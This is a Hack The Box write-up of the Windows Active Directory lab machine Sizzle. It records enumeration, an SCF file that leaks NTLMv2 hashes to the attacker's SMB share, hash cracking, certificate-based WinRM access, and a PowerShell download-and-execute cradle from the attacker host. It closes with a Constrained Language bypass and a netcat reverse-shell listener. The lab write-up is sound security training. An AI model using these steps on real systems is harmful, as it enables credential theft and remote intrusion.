---
layout: post
title:  "Sizzle Writeup - Hack The Box"
date:   2025-07-18
desc: ""
keywords: "HTB,eCPPTv3,OSEP,OSCP,Windows,ActiveDirectory,Nmap-Bootstrap-XSL,SMBCacls,Malicious SCS File,LDAP Enumeration,Mricrosoft AD Certificate Services Abuse,AppLocker Break Out,BloodHound,PsBypassCLM,Kerberoasting Attack,DCSync Attack,PassTheHash,Insane"
categories: [HTB]
tags: [HTB,eCPPTv3,OSEP,OSCP,Windows,ActiveDirectory,Nmap-Bootstrap-XSL,SMBCacls,Malicious SCS File,LDAP Enumeration,Mricrosoft AD Certificate Services Abuse,AppLocker Break Out,BloodHound,PsBypassCLM,Kerberoasting Attack,DCSync Attack,PassTheHash,Insane]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle.jpg" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

Beautiful **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** box, if there is one, it was **brutal** the energy and effort it demanded from me, due to the combination of concepts involved and the need of absolute concentration for its resolution. It was also very gratifying the practice I got in the installation, configuration, research, correction of **each tool** I had to use and in the correct command to use, a separate issue in every machine I make. The machine is listed as **Insane**, and deserves its reputation, without further preamble I'm going to log into my **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** account to spawn the box and start my new writeup.

<br /><br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The most important phase, whether it is a **Pentest**, **Audit** or **laboratory**, is the **Reconnaissance** phase. As the machine is complex, there will not be many clues that can be obtained or the information may be **overwhelming** to cause confusion about the path to choose in the search for attack vectors. With `ping` I check that I already have connectivity to the lab and with the tool developed by **[hack4u community](https://hack4u.io/){:target="_blank"}**, `whichSystem.py` (based on the **TTL** value) I can have a high degree of certainty of the **OS** installed on the box. With `nmap` I find a long list of exposed ports, typical of a machine, and with this great tool I also succeed to get detailed information about the services and their versions, available on each port. I can now take note of the most interesting data such as protocols (**FTP**, **LDAP**, **SMB**, etc), the **Common Name**, **Domain** (which I will add to my **hosts** file to save a slowly).

> A **Common Name** (**CN**), **Domain Name**, and **Fully Qualified Domain Name** (FQDN) are related but distinct terms in networking and the **Domain Name System**. The **Common Name** is a field within a digital certificate, often the **FQDN**, used to identify the entity the certificate is issued to. A **domain name** is a human-readable label that identifies a website or organization, while an **FQDN** is the complete and unambiguous domain name that includes the hostname, domain, and top-level domain (**TLD**).

- In essence:
    - The **Common Name** is used in the context of certificates for security purposes. 
    - The **Domain Name** is a more general term for the website's name. 
    - The **FQDN** is the complete and specific address that includes the domain name and hostname.

```bash
ping -c 2 10.10.10.103
whichSystem.py 10.10.10.103
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.103 -oG allPorts
nmap -sCV -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49666,49667,49673,49682,49683,49684,49691,49692,49704,49721 10.10.10.103 -oX targetedXML -oN targeted
cat targeted
#     --> ftp-anon: Anonymous FTP login allowed
#     --> Domain: HTB.LOCAL
#     --> commonName=sizzle.htb.local
#     --> sizzle.htb.local and htb.local

cat /etc/hosts | tail -n 1
ping -c 1 htb.local
ping -c 1 sizzle.htb.local
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

A more elegant and correct way to present all the information collected with `nmap`, which can be of great help in case you need to present an audit report, is to export all the information in **XML** format and then use `xsltproc` to improve the presentation of the document with a **stylesheet** and save the result in an **index.html** file. If I now start a local server with `php`, I could scroll through all the sorted information from my browser. Also available on **Github**, the **[honze-net](https://github.com/honze-net/nmap-bootstrap-xsl){:target="_blank"}** repository where you can download the **nmap-bootstrap.xsl** stylesheet, which further enhances the presentation with a custom style.

> `xsltproc` is a command line tool for applying **XSLT stylesheets** to **XML** documents. It is part of **libxslt**, the **XSLT C** library for **GNOME**. While it was developed as part of the **GNOME** project, it can operate independently of the **GNOME** desktop.

```bash
xsltproc targetedXML > index.html
php -S 0.0.0.0:80
# http://localhost

nmap -sCV -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49666,49670,49673,49690,49691,49693,49696,49711,49728,49746 10.10.10.103 --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl -oX targetedBootstrap
# http://localhost/targetedBootstrap
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I continue my **Reconnaissance** phase for those protocols that had an misconfiguration, such as **FTP** that allows me to access with `ftp` without entering a password with the **anonymous** account, but for the moment it does not allow me to upload malicious files to the server. With `dig` I explore the **DNS** protocol in search of more information, such as subdomains, I even try an **[Asynchronous Full Transfer Zone](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns){:target="_blank"}** (**AXFR**) attack unsuccessfully, but I don't find additional data.

```bash
ftp htb.local 21
    anonymous
    dir
echo "oldboy was here" > test.txt
    put test.txt

dig @10.10.10.103 sizzle.htb.local
dig @10.10.10.103 sizzle.htb.local ns
dig @10.10.10.103 sizzle.htb.local mx
dig @10.10.10.103 sizzle.htb.local axfr
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I now turn my attention to the web service, which is the service that presents a **large attack surface**. With `whatweb` from my console and with **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** from the browser I can disclose the stack behind the web application, but unfortunately it is not much, maybe the attack vector is not this one. With `rpcclient` I try to connect to the system without entering a password through the **RPC** protocol but I don't have that privilege. I also have **LDAP** available, so I can use custom `nmap` scripts (written in **LUA**) to try to perform an enumeration to leak sensitive information, but I don't see anything that represents a risk and that would allow me to find an attack vector. With `openssl` I analyze the information contained in the **SSL** certificate when connecting to the **HTTPS** secure web service available on port **443**, but still no good results for the moment.

```bash
whatweb http://10.10.10.103
whatweb http://sizzle.htb.local

rpcclient -U "" 10.10.10.103 -N
  enumdomusers        # NT_STATUS_ACCESS_DENIED
  enumdomgroups       # NT_STATUS_ACCESS_DENIED

locate *.nse | grep "ldap"     nmap --script ldap\*...
nmap --script ldap-* -p389 10.10.10.103

openssl s_client --connect 10.10.10.103:443
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

**Something <ins>I must correct</ins>**, is that I always forget in my labs on **Windows OS** machines to get system information with `crackmapexec`, so I can have an overview of what I face and accelerate the search for attack vectors. With `smbclient` and `smbmap` I can connect through the **SMB** protocol and I can already find interesting things, I have permissions to access the **Department Shares** resource (although I can't write on it). The directory has a lot of folders to investigate, so to have a better browsing experience I'm going to create a **[CIFS](https://linuxize.com/post/how-to-mount-cifs-windows-share-on-linux/){:target="_blank"}** mount and link it to the **Department Shares** share.

> On **Linux** and **UNIX** operating systems, a **Windows share** can be mounted on a particular mount point in the local directory tree using the **cifs** option of the `mount` command. The **Common Internet File System** (**CIFS**) is a network file-sharing protocol. **CIFS** is a form of **SMB**.

```bash
crackmapexec smb 10.10.10.103
smbclient -L 10.10.10.103 -N
smbmap -H 10.10.10.103 -u 'null' --no-banner
# --> Department Shares
smbclient //10.10.10.103/Department\ Shares -N
  dir                # <-- Too many directories!

mkdir sizzleSMBShare
mount -t cifs //10.10.10.103/Department\ Shares ./sizzleSMBShare
tree -fas
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After spending some time browsing through the available folders and files, in which I don't find much interesting information, it occurs to me that I should investigate in which folders of the system user accounts I have **write** permissions. Manually it turns out to be very tedious and slow, so I generate a list of the folder names and with a one-liner, using the `smbcacls` command, I get the real permissions in each one of them, also with `grep` I leak the folder names in which anyone can write. After waiting a moment I get a positive result, I can write in the **Public** folder.

> **`smbcacls`**: Set or get **ACLs** on an **NT** file or directory names. The `smbcacls` program manipulates **NT Access Control Lists** (**ACLs**) on **SMB file shares**. An **ACL** is comprised zero or more **Access Control Entries** (**ACEs**), which define access restrictions for a specific user or group.

```bash
man smbcacls

smbcacls //10.10.10.103/Department\ Shares Accounting
smbcacls //10.10.10.103/Department\ Shares Users/mrb3n
# --> Only I can read! Not write!
smbcacls //10.10.10.103/Department\ Shares Users/mrb3n -N | grep -i everyone

find . \-type d 2>/dev/null
find . \-type d 2>/dev/null | sed -e 's/^\.\///'
find . \-type d 2>/dev/null | sed -e 's/^\.\///' | while read directory; do echo $directory; done
find . \-type d 2>/dev/null | sed -e 's/^\.\///' | while read directory; do echo -e "\n[+] ACLs/Everyone on $directory"; smbcacls //10.10.10.103/Department\ Shares $directory -N | grep -i everyone; done
# [+] ACLs/Everyone on Users/Public
# ACL:Everyone:ALLOWED/OI|CI/FULL       <-- FULL  --> I can write in Public!!
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I could find out that I can upload malicious content in the system, I investigate with a search engine those **[executable file extensions for Windows OS](https://en.wikipedia.org/wiki/List_of_file_formats#Object_code,_executable_files,_shared_and_dynamically_linked_libraries){:target="_blank"}**. My next step is to create files with these extensions and see if any system task or even the antivirus does not allow it, but I have no problems, what is done is a cleaning of what I upload in a certain time, something **I must keep in mind**. In Internet I succeed to find a very interesting research that would allow me to **[obtain a hash of a user account of the system just by uploading a malicious SCF file](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/){:target="_blank"}**. So I create the **.scf** file and upload it to the **Public** folder, now when the user browses the resource it will cause a connection to be established to the path I declare inside the file and in this way I get a **NTLMv2** hash that I succeed to crack with `john`.

> **[SCF (Shell Command File)](https://amazingalgorithms.com/file-extensions/scf/){:target="_blank"}** is a file extension developed by **Microsoft** for **Windows operating systems**. It is a type of batch file that contains a series of commands that are executed by the **Windows Command Processor** (`cmd.exe`). **SCF** files are typically used to automate tasks or to create custom menus and shortcuts.

```bash
touch test.{exe,jar,zip,doc,pdf,dll,scf}
watch -n 1 ls -l                    # .. wait.... delete all --> task!

nvim oldb0y.scf
cat oldb0y.scf
```

> **oldb0y.scf**:

```scf
[Shell]
Command=2
IconFile=\\10.10.14.2\smbFolder\oldb.ico
[Taskbar]
Command=ToggleDesktop
```

```
impacket-smbserver smbFolder $(pwd) -smb2support

nvim hash
cat !$
hashcat --example-hashes | grep -i NTLMv2 -A 5 -B 2

hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `crackmapexec` I check that the credentials are valid, but at the moment they are not useful to connect through **WinRM** protocol with `evil-winrm`. Maybe the passwords will help me to enumerate with `ftp`, but the authentication fails, I have no luck with **[LDAP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html?highlight=ldap#389-636-3268-3269---pentesting-ldap){:target="_blank"}** when using `ldapsearch`, so now it is the turn of **RPC**, I succeed to access with `rpcclient` and leak users, groups, metadata of the **Administrator** and **amanda** user accounts, but nothing relevant for the moment. With `smbmap` and `smbclient` I don't find new resources to which I now have access, but something that I had overlooked, a folder that would be related to the **AD Certificate Services** (I'll write it down to keep it in mind later).

```bash
crackmapexec smb 10.10.10.103 -u amanda -p 'Ashare1972'         # :)
crackmapexec winrm 10.10.10.103 -u amanda -p 'Ashare1972'       # :(

ftp sizzle.htb.local 21

rpcclient -U "amanda%Ashare1972" 10.10.10.103
  enumdomusers
  enumdomgroups

rpcclient -U "amanda%Ashare1972" 10.10.10.103 -c 'enumdomusers'
rpcclient -U "amanda%Ashare1972" 10.10.10.103 -c 'enumdomgroups'
rpcclient -U "amanda%Ashare1972" 10.10.10.103 -c 'queryuser 0x1f4'
rpcclient -U "amanda%Ashare1972" 10.10.10.103 -c 'queryuser 0x644'

gem install evil-winrm
evil-winrm -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'
# An error of type WinRM::WinRMHTTPTransportError happened... :(

ldapsearch -x -H ldap://10.10.10.103 -D 'sizzle\ldap' -w 'Ashare1972' -b "DC=sizzle,DC=htb"    # :(

smbclient -L 10.10.10.103 -U 'amanda'
smbmap -H 10.10.10.103 -u 'amanda' --no-banner
smbmap -H 10.10.10.103 -u 'amanda%Ashare1972' --no-banner
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since I don't find much on **Windows** proprietary protocols, I'm going to resume my research on web service, but on both **HTTP** and **HPTTS** protocols, with **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I find no difference in the technology stack behind each application. With `wfuzz` I perform a discovery of files (which are usually on an **IIS** server) and web directories, in the non-secure protocol (**HTTP**) I don't find much, but in the secure (**HTTPS**) I start to find information related to the **AD Certificate Service** (<ins>the pieces are falling into place</ins> and I can get a vague idea of where an attack vector might emerge). The credentials I had succeeded in cracking are used to authenticate me to the service.

```bash
# https://sizzle.htb.local/
# http://sizzle.htb.local/

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt https://htb.local/FUZZ
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,asp-aspx-txt-html http://htb.local/FUZZ.FUZ2Z

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,asp-aspx-txt-html https://htb.local/FUZZ.FUZ2Z

find /usr/share/SecLists \-name \*IIS\* 2>/dev/null
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/IIS.fuzz.txt https://htb.local/FUZZ

# https://sizzle.htb.local/aspnet_client/
# https://sizzle.htb.local/certsrv/
# amanda:...      :)
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I think the route to access the system is through the **WinRM** protocol but using a secure connection with **SSL** certificates (the default port is open - **5986**), `evil-winrm` has the necessary tools I just need to use the correct flags (I must remember that **I don't have a certificate yet**). From the information collected I confirm that **amanda's account** belongs to the **Domain Admins** group, so it also belongs to the **Remote Management Users group** (which allows her to connect through **WinRM**). In the **AD Certificates web service** I can request a new certificate for **amanda's account**, I just need to generate an **Advanced Certificate Request**.

> By default **WinRM** uses **Kerberos** for authentication so **Windows** never sends the password to the system requesting validation. **[WinRM HTTPS](https://learn.microsoft.com/en-us/troubleshoot/windows-client/system-management-components/configure-winrm-for-https){:target="_blank"}** requires a local computer **Server Authentication certificate** with a **CN** matching the hostname to be installed. The certificate mustn't be expired, revoked, or self-signed.

```bash
evil-winrm --help
# -S, --ssl                        Enable ssl
# -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
# -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate

php -S 0.0.0.0:80
# http://127.0.0.1/domain_users.html
# sizzler --> [MemberOf] Domain Admins
# http://127.0.0.1/domain_users_by_group.html#cn_Domain_Admins
# Remote Management Users: amanda !!! (evil-winrm)

# http://10.10.10.103/certsrv
# Request a certificate --> advanced certificate request
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

My idea is to request a certificate and connect to `evil-winrm` using the **SSL** secure protocol, so before sending a new request I'm going to use `openssl` to **[generate a Certificate Signin Request (CSR)](https://www.ssl.com/how-to/manually-generate-a-certificate-signing-request-csr-using-openssl/){:target="_blank"}**, needed to generate the certificate, and now I can attach it to the request. Quickly the service allows me to download the certificate to my machine, and using `evil-winrm` (with the correct flags) I succeed to connect to the machine. I perform some basic enumeration commands and the most interesting thing I find is that the default port of the **Kerberos** protocol (**88**) is open locally, maybe it is a clue to perform an **[AS-REP Roasting attack](https://www.picussecurity.com/resource/blog/as-rep-roasting-attack-explained-mitre-attack-t1558.004){:target="_blank"}** with `impacket-GetNPUsers`, I have all the information even with a list of accounts to check but the port is **only exposed locally**.

> A **Certificate Signing Request** (**CSR**) is a digitally encoded message containing information like your **organization name**, **domain name**, and **public key**, used to request a **digital certificate** (like an **SSL/TLS certificate**) from a **Certificate Authority** (**CA**). It essentially acts as an application form, providing the **CA** with the necessary details to issue a certificate that verifies the identity of your website or organization.

> **OpenSSL** is a very useful open-source command-line toolkit for working with **X.509 certificates**, **certificate signing requests** (**CSRs**), and **cryptographic keys**. If you are using a **UNIX** variant like Linux or macOS, **OpenSSL** is probably already installed on your computer. If you would like to use **OpenSSL** on Windows, you can enable Windows 10’s Linux subsystem or install **Cygwin**.

> **[AS-REP Roasting attack](https://www.picussecurity.com/resource/blog/as-rep-roasting-attack-explained-mitre-attack-t1558.004){:target="_blank"}**: If pre-authentication is disabled, the **DC** prematurely sends an **AS-REP** upon receiving an **AS-REQ**. This response includes sensitive data, with segments encrypted using the user's password hash. This vulnerability allows attackers to extract this encrypted data without initially providing any valid authentication details. Once obtained, attackers can perform offline brute-force or dictionary attacks to obtain the user's password.

> **Attacker Machine**:

```bash
# http://10.10.10.103/certsrv
# Request a certificate --> advanced certificate request

openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
ls amanda*
cat amanda.csr | xclip -sel clip

evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```

> **Victime Machine**:

```cmd
whoami
hostname
ipconfig

whoami /priv
whoami /all
netstat -ano
# TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       612      Kerberos!
```

> **Attacker Machine**:

```bash
impacket-GetNPUsers --help
# Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
# target                [[domain/]username[:password]]
# -usersfile USERSFILE  File with user per line to test
# -no-pass              don't ask for password (useful for -k)

nvim users
cat users
impacket-GetNPUsers htb.local/ -no-pass -usersfile users
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I could use **[chisel](https://github.com/jpillora/chisel){:target="_blank"}** to create a tunnel from my local port **88** (**Kerberos**) to the victim machine, but first I'm going to use **BloodHound** and **[install it using Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart){:target="_blank"}** (I'm also going to **clean up all** my already unnecessary infrastructure **Docker**) and investigate for attack vectors that allow me to **Escalate privileges** or **Users pivoting**. I download the executable `bloodhound-cli`, in charge of installing everything necessary on my machine, and I can start the installation, also be aware of the messages where it informs me the **URL** and **password** to access **BloodHound** (after updating the credentials). The tool already has a repository of **Collectors** of information from an **AD**, which I can download and transfer to the victim machine.

```bash
docker rm $(docker ps -a -q) --force
docker rmi $(docker images -q)
docker volume rm $(docker volume ls -q)
docker network rm $(docker network ls -q)

wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo su
./bloodhound-cli install

# http://127.0.0.1:8080/ui/login
# :)
# http://127.0.0.1:8080/ui/download-collectors
```

<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/sizzle_writeup/Sizzle_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As the **OS** version of the machine is old I'm going to download a deprecated version of the **[`SharpHound.ps1`](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1){:target="_blank"}** collector and transfer it to the victim machine. The **AD** has the **[Constrained Language](https://www.reddit.com/r/PowerShell/comments/nv3e58/getting_newobject_cannot_create_type_only_core/){:target="_blank"}** security feature **enabled**, so I won't be able to run some **cmdlets** (including those used by `SharpHound.ps1`), but there is an excellent tool from **[padovah4ck](https://github.com/padovah4ck/PSByPassCLM){:target="_blank"}**, **[`PsBypassCLM.exe`](https://github.com/padovah4ck/PSByPassCLM/blob/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe){:target="_blank"}**, that can help me bypass this restriction. I download it to my machine and successfully transfer it to the target, now I use a command that sends me a **Reverse Shell** without the **Constrained Language** restriction, but it doesn't work on my first try. A funny thing that happened to me is that **I must have cloned the project** on my machine and **not directly downloaded the PsBypassCLM tool**. Now I can execute the indicated command and catch the incoming connection on port **443** with `nc`. I check that there are no language restrictions and try again to use the `SharpHound.ps1` collector, but it still does not generate the compressed file of the collected information. With `SharpHound.exe` I have version problems so I have to look for another way.

> **Constrained Language mode** in **PowerShell** is a security feature that restricts the use of certain **PowerShell language elements** and **cmdlets**, limiting the ability of scripts and commands to perform potentially harmful operations. It's designed to **mitigate risks** associated with malicious actors using PowerShell for attacks.

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/sharphound-v2.6.7.zip .
unzip sharphound-v2.6.7.zip
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/SharpHound.ps1')
# Cannot create type. Only core types are supported in this language mode.      :(

$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage   :(

Get-ComputerInfo
```

> **Attacker Machine**:

```bash
crackmapexec smb 10.10.10.103
# Windows 10 / Server 2016 Build 14393 x64

wget https://github.com/padovah4ck/PSByPassCLM/blob/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
iwr -uri http://10.10.14.2/PsBypassCLM.exe -OutFile ./PsBypassCLM.exe
```

> **Attacker Machine**:

```bash
rlwrap nc -nlvp 443
```

